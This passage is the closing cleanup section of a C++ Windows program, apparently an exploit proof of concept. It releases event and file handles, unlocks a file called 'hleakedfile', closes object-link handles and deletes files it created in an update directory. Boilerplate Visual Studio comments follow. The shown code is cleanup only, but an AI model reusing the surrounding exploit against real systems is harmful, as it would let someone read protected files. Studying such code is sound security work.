	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);

	if (hreleaseready)
	{
		SetEvent(hreleaseready);
		Sleep(1000);
		CloseHandle(hreleaseready);
	}
	if (hleakedfile)
	{
		if (filelocked)
			UnlockFile(hleakedfile, NULL, NULL, NULL, NULL);
		CloseHandle(hleakedfile);
	}
	if (leakedfilebuff)
		free(leakedfilebuff);
	for (int ci = 0; ci < 3; ci++)
		if (hobjlinks[ci]) { CloseHandle(hobjlinks[ci]); hobjlinks[ci] = NULL; }
	if (needupdatedircleanup)
	{
		wchar_t dirtoclean[MAX_PATH] = { 0 };
		wcscpy(dirtoclean, dirmoved ? newtmp : updatepath);
		UpdateFilesListCurrent = UpdateFilesList;
		while(UpdateFilesListCurrent)
		{

			if (UpdateFilesListCurrent->filecreated)
			{
				wchar_t filetodel[MAX_PATH] = { 0 };
				wcscpy(filetodel, dirtoclean);
				wcscat(filetodel, L"\\");
				MultiByteToWideChar(CP_ACP, NULL, UpdateFilesListCurrent->filename, -1, &filetodel[lstrlenW(filetodel)], MAX_PATH - lstrlenW(filetodel) * sizeof(wchar_t));
				DeleteFile(filetodel);
			}
			UpdateFiles* UpdateFilesListOld = UpdateFilesListCurrent;
			UpdateFilesListCurrent = UpdateFilesListCurrent->next;
			free(UpdateFilesListOld);
		}
		RemoveDirectory(dirtoclean);
	}


	return processresult;
}


// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
